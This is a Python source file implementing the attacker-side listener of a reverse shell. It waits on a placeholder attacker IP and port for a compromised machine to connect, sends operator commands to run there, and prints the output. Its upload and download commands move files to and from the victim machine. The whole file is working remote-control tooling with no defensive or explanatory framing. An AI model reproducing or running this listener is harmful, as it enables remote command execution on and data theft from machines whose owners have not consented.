import socket
import json
import base64


class Listener:
    def __init__(self, ip, port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((ip, port))
        self.listener.listen(1)
        print("[+] Listening for connections")
        self.connection, self.address = self.listener.accept()
        print(f"[+] Connection established with {self.address}")

    def execute_system_commands(self, command):
        self.send_data(command)
        if command[0] == "exit":
            self.connection.close()
            print(f"[-] Closing connection with {self.address}")
            exit(0)
        return self.receive_data()

    def send_data(self, data):
        json_data = json.dumps(data).encode()
        self.connection.send(json_data)

    def receive_data(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return f"[+] Downloaded {path}"

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode()
        except FileNotFoundError:
            return "[-] No such file"

    def run(self):
        while True:
            command = input(">> ").split(" ")
            try:
                if command[0] == "upload" and len(command) > 1:
                    file_content = self.read_file(command[1])
                    if "[-]" not in file_content:
                        command.append(file_content)

                command_result = self.execute_system_commands(command)

                if command[0] == "download" and "[-]" not in command_result:
                    command_result = self.write_file(command[1], command_result)

            except Exception as e:
                command_result = f"[-] Error during execution: {e}"

            print(command_result)


cykitlistener = Listener("[ATTACKER IP]", [ATTACKER PORT])
cykitlistener.run()
